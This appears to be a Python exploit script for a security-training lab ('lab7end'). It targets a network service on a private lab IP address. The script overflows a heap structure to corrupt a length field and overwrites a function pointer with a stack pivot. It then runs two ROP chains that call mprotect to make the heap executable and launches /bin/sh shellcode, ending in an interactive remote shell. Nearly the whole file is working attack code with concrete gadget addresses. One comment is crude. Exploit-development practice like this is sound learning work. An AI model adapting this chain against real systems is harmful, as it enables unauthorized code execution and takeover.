#!/usr/bin/env python3
#
# lab7end: 0verfl0wz_0n_th3_h3ap_4int_s0_bad
#

import sys
import struct
import socket

def main():

  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect(("192.168.159.129", 7741))
  sock.settimeout(1)

  if len(recvall(sock)) > 1:
    print("[*] Banner recieved, continuing exploitation")
  else:
    print("[-] Banner grab failed exiting...")
    exit(-1)

  corrupt_structure(sock)
  exploit(sock)

  while True:

    try:
      sock.send(input("wetw0rk> ").encode('latin-1') + b"\n")
      print(recvall(sock).decode('latin-1'))
    except:
      print("[-] Exiting shell...")

# exploit: overwrite the pointer within the second allocated structure and call it!
def exploit(sockfd):

  shellcode = (
  # http://shell-storm.org/shellcode/files/shellcode-811.php
  b"\x31\xc0\x50\x68\x2f\x2f\x73"
  b"\x68\x68\x2f\x62\x69\x6e\x89"
  b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
  b"\xcd\x80\x31\xc0\x40\xcd\x80"
  )

  # trigger the heap overflow once more and overwrite the
  # print_message pointer with our stackpivot  
  sockfd.send(b"2\n")
  recvall(sockfd)

  sockfd.send(b"0\n")
  recvall(sockfd)

  offset  = b"A" * 140
  pivot   = struct.pack('<I', 0x08086e77) # add esp, 0x11 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
  rest    = gen_ropchain_two()
  rest   += shellcode
  rest   += b'\n'

  print("[*] Overwriting pointer to print_message within new structure")
  payload = offset + pivot + rest
  
  sockfd.send(payload)
  recvall(sockfd)

  print("[*] Who said we needed a memory leak?")
  sockfd.send(b"4\n")
  recvall(sockfd)

  sockfd.send(b"1" + gen_ropchain_one() + b'\n')

  print("[+] Enjoy your shell!\n")

# gen_ropchain_two: final rop chain, called after triggering heap flip, executing our shellcode
def gen_ropchain_two():

  #
  # EAX == mprotect(
  #   (EBX) void *addr = StartOfHeap (the starting address MUST be the start of a memory page),
  #   (ECX) size_t len = 0x22000 (size),
  #   (EDX) int prot = 0x07 (READ|WRITE|EXECUTE)
  #
  rop_gadgets = [
    0x08053ebe, # ret
    0x08053ebe, # ret
    0x080e76ad, # pop ecx ; ret
    0x1110f629, #
    0x0804838e, # pop ebp ; ret
    0x11111111, #
    0x0808391a, # sub ebp, ecx ; ret (0x11111111 - 0x1110f629 = 0x1ae8)
    0x08097e08, # mov eax, esi ; pop ebx ; pop esi ; pop edi ; ret
    0x41414141, # <compensate pop>
    0x41414141, # <compensate pop>
    0x41414141, # <compensate pop>
    0x0805581a, # sub eax, ebp ; pop ebp ; ret (EAX=>HEAP_CHUNK - 0x1ae8 = HEAP_BASE)
    0x41414141, # <compensate pop>
    0x080aad9c, # xchg eax, edx ; ret
    0x0805dfff, # mov esi, edx ; ret
    0x080481c9, # pop ebx ; ret
    0xffffffff, #
    0x080dce5d, # inc ebx ; ret 
    0x080e76ad, # pop ecx ; ret
    0xeeeeffff, #
    0x0804846f, # pop edi ; ret
    0x11132001, #
    0x080dd199, # add ecx, edi ; add cl, byte ptr [edx] ; ret (0xeeeeffff + 0x11132001 = 0x22000) [ECX]
    0x08067323, # add ebx, esi ; movq qword ptr [edx], mm0 ; mov eax, edx ; ret (HEAP_PTR - 0x1ae8 = BASE) [EBX]
    0x08055bd5, # mov edx, 0xffffffff ; ret
    0x0805ea27, # inc edx ; ret
    0x0805ea27, # inc edx ; ret
    0x0805ea27, # inc edx ; ret
    0x0805ea27, # inc edx ; ret
    0x0805ea27, # inc edx ; ret
    0x0805ea27, # inc edx ; ret
    0x0805ea27, # inc edx ; ret
    0x0805ea27, # inc edx ; ret [EDX]
    0x0804838e, # pop ebp ; ret
    0x11111094, #
    0x080bd226, # pop eax ; ret
    0x11111111, #
    0x0805581a, # sub eax, ebp ; pop ebp ; ret [EAX]
    0x41414141, # <compensate pop>
    0x080709e0, # int 0x80 ; ret
    0x080c2cb4, # jmp esp
    0x90909090, #
  ]

  return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

# gen_ropchain_one: we make our own mofucking heap flips bitch (cutting it close)
def gen_ropchain_one():

  rop_gadgets = [
    0x0806a79f, # nop ; mov eax, edx ; ret
    0x0807cd75, # nop ; inc eax ; ret
    0x0807cd75, # nop ; inc eax ; ret
    0x0807cd75, # nop ; inc eax ; ret
    0x0807cd75, # nop ; inc eax ; ret
    0x0805dfff, # mov esi, edx ; ret (backup heap chunk address)
    0x0804bb6c, # xchg eax, esp ; ret (heap flip)
  ]

  return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

# corrupt_structure: leverage the heap overflow and corrupt datalen member within struct
def corrupt_structure(sockfd):

  # create the the structure, and overwrite the data length stored
  # within the structure (HEAP OVERFLOW)
  print("[*] Overwriting datalen member within allocated struct")
  sockfd.send(b"1\n")
  recvall(sockfd)

  sockfd.send(b"%d\n" % 0x83)
  recvall(sockfd)

  sockfd.send(b"A" * 0x80 + b"\xff\xff\n")
  recvall(sockfd)

  print("[*] Allocating a new struct object")
  sockfd.send(b"1\n")
  recvall(sockfd)

  sockfd.send(b"7\n")
  recvall(sockfd)

  sockfd.send(b"wetw0rk\n")
  recvall(sockfd)

  return

# recvall: get all data from the servers response, not just newlines
def recvall(sockfd):

  # i used the timeout to handle EOF from sockfd
  data = b''
  while True:
    try:
      data += sockfd.recv(4096)
    except:
      break

  return data

main()
